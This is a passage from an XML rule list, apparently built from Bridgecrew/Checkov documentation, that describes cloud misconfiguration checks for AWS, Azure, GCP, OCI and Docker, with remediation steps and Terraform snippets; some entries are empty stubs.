        cmk_arn   = aws_kms_key.dlm_cross_region_copy_cmk.arn
        copy_tags = true
        retain_rule {
          interval      = 30
          interval_unit = "DAYS"
        }
      }

      cross_region_copy_rule {
        target    = "us-west-2"
        encrypted = true
        cmk_arn   = aws_kms_key.dlm_cross_region_copy_cmk.arn
        copy_tags = true
        retain_rule {
          interval      = 20
          interval_unit = "DAYS"
        }
      }
    }

    target_tags = {
      Snapshot = "true"
    }
  }
  tags = {
    test = "failed"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-dlm-cross-region-schedules-are-encrypted-using-a-customer-managed-key-cmk' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-dlm-cross-region-schedules-are-encrypted-using-a-customer-managed-key-cmk</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-dlm-cross-region-schedules-are-encrypted-using-a-customer-managed-key-cmk' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_138</key>
    <name>Ensure Azure ACR disables anonymous image pulling</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-acr-enables-anonymous-image-pulling"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-acr-enables-anonymous-image-pulling"></div>Azure ACR enables anonymous image pulling</div><a aria-label="Skip link to Azure ACR enables anonymous image pulling" class="heading-anchor-icon fa fa-anchor" href="#azure-acr-enables-anonymous-image-pulling"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_role_definition</li>
<li><strong>Argument</strong>: actions</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_role_definition" "example" {

}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-acr-disables-anonymous-image-pulling' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-acr-disables-anonymous-image-pulling</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-acr-disables-anonymous-image-pulling' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_93</key>
    <name>Ensure GCP Spanner Database is encrypted with Customer Supplied Encryption Keys (CSEKs)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-spanner-database-is-not-encrypted-with-customer-supplied-encryption-keys-cseks"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-spanner-database-is-not-encrypted-with-customer-supplied-encryption-keys-cse-ks"></div>GCP Spanner Database is not encrypted with Customer Supplied Encryption Keys (CSEKs)</div><a aria-label="Skip link to GCP Spanner Database is not encrypted with Customer Supplied Encryption Keys (CSEKs)" class="heading-anchor-icon fa fa-anchor" href="#gcp-spanner-database-is-not-encrypted-with-customer-supplied-encryption-keys-cseks"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Customer-Supplied Encryption Keys (CSEK) are a feature in Google Cloud Storage and Google Compute Engine. Google Compute Engine encrypts all data at rest by default. Compute Engine handles and manages this encryption automatically, with no additional action required. When you provide your own encryption keys Compute Engine uses your key to protect the Google-generated keys used to encrypt and decrypt your data. Only users that provide the correct key can use resources protected by a customer-supplied encryption key. Google does not store your keys on its servers and cannot access your protected data unless you provide the key. If you forget or lose your key Google is unable to recover the key or to recover any data encrypted with that key. To control and manage this encryption yourself, you must provide your own encryption keys.</p>
<p>We recommend you supply your own encryption keys for Google to use, at a minimum to encrypt business critical Spanner Database. This helps protect the Google-generated keys used to encrypt and decrypt your data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<ul>
<li><strong>Resource</strong>: google_spanner_database</li>
<li><strong>Arguments</strong>:  encryption_config.kms_key_name</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_spanner_database" "pass" {
  instance = google_spanner_instance.example.name
  name     = "my-database"
  ddl = [
    "CREATE TABLE t1 (t1 INT64 NOT NULL,) PRIMARY KEY(t1)",
    "CREATE TABLE t2 (t2 INT64 NOT NULL,) PRIMARY KEY(t2)",
  ]
  deletion_protection = false
     encryption_config {
       kms_key_name= google_kms_crypto_key.example.name
     }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-spanner-database-is-encrypted-with-customer-supplied-encryption-keys-cseks' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-spanner-database-is-encrypted-with-customer-supplied-encryption-keys-cseks</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-spanner-database-is-encrypted-with-customer-supplied-encryption-keys-cseks' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_DOCKER_9</key>
    <name>Ensure Docker APT is not used</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="docker-apt-is-used"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-docker-apt-is-used"></div>Docker APT is used</div><a aria-label="Skip link to Docker APT is used" class="heading-anchor-icon fa fa-anchor" href="#docker-apt-is-used"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix"></div>Fix</div><a aria-label="Skip link to Fix" class="heading-anchor-icon fa fa-anchor" href="#fix"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-docker-apt-is-not-used' target='_blank'> https://docs.bridgecrew.io/docs/ensure-docker-apt-is-not-used</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-docker-apt-is-not-used' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_250</key>
    <name>Ensure AWS RDS PostgreSQL instances use a non-vulnerable version of log_fdw extension</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-rds-postgresql-instances-use-a-vulnerable-version-of-log_fdw-extension"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-rds-postgre-sql-instances-use-a-vulnerable-version-of-log-fdw-extension"></div>AWS RDS PostgreSQL instances use a vulnerable version of log_fdw extension </div><a aria-label="Skip link to AWS RDS PostgreSQL instances use a vulnerable version of log_fdw extension " class="heading-anchor-icon fa fa-anchor" href="#aws-rds-postgresql-instances-use-a-vulnerable-version-of-log_fdw-extension"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-rds-postgresql-instances-use-a-non-vulnerable-version-of-log_fdw-extension' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-rds-postgresql-instances-use-a-non-vulnerable-version-of-log_fdw-extension</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-rds-postgresql-instances-use-a-non-vulnerable-version-of-log_fdw-extension' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_150</key>
    <name>Ensure Azure Machine Learning Compute Cluster Minimum Nodes is set to 0</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-machine-learning-compute-cluster-minimum-nodes-is-not-set-to-0"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-machine-learning-compute-cluster-minimum-nodes-is-not-set-to-0"></div>Azure Machine Learning Compute Cluster Minimum Nodes is not set to 0</div><a aria-label="Skip link to Azure Machine Learning Compute Cluster Minimum Nodes is not set to 0" class="heading-anchor-icon fa fa-anchor" href="#azure-machine-learning-compute-cluster-minimum-nodes-is-not-set-to-0"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> </li>
<li><strong>Argument:</strong></li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cognitive_account" "example" {
 
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-machine-learning-compute-cluster-minimum-nodes-is-set-to-0' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-machine-learning-compute-cluster-minimum-nodes-is-set-to-0</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-machine-learning-compute-cluster-minimum-nodes-is-set-to-0' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_223</key>
    <name>Ensure AWS ECS Cluster enables logging of ECS Exec</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-ecs-cluster-does-not-enable-logging-of-ecs-exec"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-ecs-cluster-does-not-enable-logging-of-ecs-exec"></div>AWS ECS Cluster does not enable logging of ECS Exec</div><a aria-label="Skip link to AWS ECS Cluster does not enable logging of ECS Exec" class="heading-anchor-icon fa fa-anchor" href="#aws-ecs-cluster-does-not-enable-logging-of-ecs-exec"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-ecs-cluster-enables-logging-of-ecs-exec' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-ecs-cluster-enables-logging-of-ecs-exec</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-ecs-cluster-enables-logging-of-ecs-exec' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_40</key>
    <name>Ensure IAM policies are only attached to Groups and Roles</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="iam-policies-are-not-only-attached-to-groups-and-roles"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-iam-policies-are-not-only-attached-to-groups-and-roles"></div>IAM policies are not only attached to Groups and Roles</div><a aria-label="Skip link to IAM policies are not only attached to Groups and Roles" class="heading-anchor-icon fa fa-anchor" href="#iam-policies-are-not-only-attached-to-groups-and-roles"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>By default, IAM users, groups, and roles have no access to AWS resources. IAM policies are the means by which privileges are granted to users, groups, or roles. </p>
<p>Assigning privileges at the group or role level reduces the complexity of access management as the number of users increase. Reducing access management complexity may in-turn reduce opportunity for a principal to inadvertently receive or retain excessive privileges. </p>
<p>We recommend that IAM policies are applied directly to groups and roles, but not to users.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::IAM::Policy</li>
<li><strong>Arguments:</strong> Properties.Users</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  ExamplePolicy:
    Type: 'AWS::IAM::Policy'
    Properties:
      ...
-     Users:
-       - example_user
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/iam_16-iam-policy-privileges-1' target='_blank'> https://docs.bridgecrew.io/docs/iam_16-iam-policy-privileges-1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/iam_16-iam-policy-privileges-1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_94</key>
    <name>Ensure GCP Dataflow jobs are private</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-dataflow-jobs-are-not-private"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-dataflow-jobs-are-not-private"></div>GCP Dataflow jobs are not private</div><a aria-label="Skip link to GCP Dataflow jobs are not private" class="heading-anchor-icon fa fa-anchor" href="#gcp-dataflow-jobs-are-not-private"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Cloud Dataflow in GCP is a service used for streaming and batch data processing. A Dataflow job consists of at least one management node and one compute node (both are GCE VMs). By default, these nodes are configured with public IPs that allow them to communicate with the public internet, but this also means they increase your potential attack surface by being publicly accessible.</p>
<p>We recommend you remove the public IPs for your Dataflow jobs. View the <a href="https://cloud.google.com/dataflow/docs/guides/routes-firewall#internet_access_for" target="_self">official Google documentation</a> for the currently supported internet access configuration options.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>Making Dataflow jobs private via the console is not currently supported.</p>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>Making <strong>running</strong> Dataflow jobs private via the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud</code> CLI is not currently supported. Instead, you need to <strong>drain</strong> or <strong>cancel</strong> your job and then re-create with the correct flag configured.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name=""># To cancel a Dataflow job
gcloud dataflow jobs cancel JOB_ID
</code></pre></div></div>
<p>Replace <strong>JOB_ID</strong> with your Dataflow job ID.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name=""># To drain a Dataflow job
gcloud dataflow jobs drain JOB_ID
</code></pre></div></div>
<p>Replace <strong>JOB_ID</strong> with your Dataflow job ID.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name=""># To create a new Dataflow job without public IPs
gcloud dataflow jobs run JOB_NAME \
  --disable-public-ips \
  --gcs-location=GCS_LOCATION
</code></pre></div></div>
<p>Replace <strong>JOB_ID</strong> with your Dataflow job ID. Replace <strong>GCS_LOCATION</strong> with the GCS bucket name where your job template lives. Must be a URL beginning with <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gs://</code>.</p>
<p>Google also provides documentation on how to <a href="https://cloud.google.com/dataflow/docs/guides/routes-firewall#turn_off_external_ip_address" target="_self">Turn off external IP address</a> for your Dataflow jobs. This documentation has examples for <strong>Java</strong> and <strong>Python</strong>.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_dataflow_job</li>
<li><strong>Field</strong>: ip_configuration</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_dataflow_job" "big_data_job" {
  name              = "dataflow-job"
  template_gcs_path = "gs://my-bucket/templates/template_file"
  temp_gcs_location = "gs://my-bucket/tmp_dir"
  parameters = {
    foo = "bar"
    baz = "qux"
  }

-  ip_configuration = "WORKER_IP_PUBLIC"
+  ip_configuration = "WORKER_IP_PRIVATE"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-cloud-dataflow-job-has-public-ips' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-cloud-dataflow-job-has-public-ips</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-cloud-dataflow-job-has-public-ips' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OCI_20</key>
    <name>Ensure OCI security list does not allow ingress from 0.0.0.0/0 to port 3389</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-security-list-allows-ingress-from-00000-to-port-3389"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-security-list-allows-ingress-from-0-0-0-0-0-to-port-3389"></div>OCI security list allows ingress from 0.0.0.0/0 to port 3389</div><a aria-label="Skip link to OCI security list allows ingress from 0.0.0.0/0 to port 3389" class="heading-anchor-icon fa fa-anchor" href="#oci-security-list-allows-ingress-from-00000-to-port-3389"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-oci-security-list-does-not-allow-ingress-from-00000-to-port-3389' target='_blank'> https://docs.bridgecrew.io/docs/ensure-oci-security-list-does-not-allow-ingress-from-00000-to-port-3389</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-oci-security-list-does-not-allow-ingress-from-00000-to-port-3389' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_262</key>
    <name>Ensure AWS Kendra index server side encryption uses Customer Managed Keys (CMKs)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-kendra-index-server-side-encryption-does-not-use-customer-managed-keys-cmks"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-kendra-index-server-side-encryption-does-not-use-customer-managed-keys-cm-ks"></div>AWS Kendra index server side encryption does not use Customer Managed Keys (CMKs)</div><a aria-label="Skip link to AWS Kendra index server side encryption does not use Customer Managed Keys (CMKs)" class="heading-anchor-icon fa fa-anchor" href="#aws-kendra-index-server-side-encryption-does-not-use-customer-managed-keys-cmks"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Kendra index servers which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your Kendra index server data. It gives you full control over the encrypted data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="resource-aws_kendra_index"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-resource-aws-kendra-index"></div>Resource: aws_kendra_index</div><a aria-label="Skip link to Resource: aws_kendra_index" class="heading-anchor-icon fa fa-anchor" href="#resource-aws_kendra_index"></a></h2>
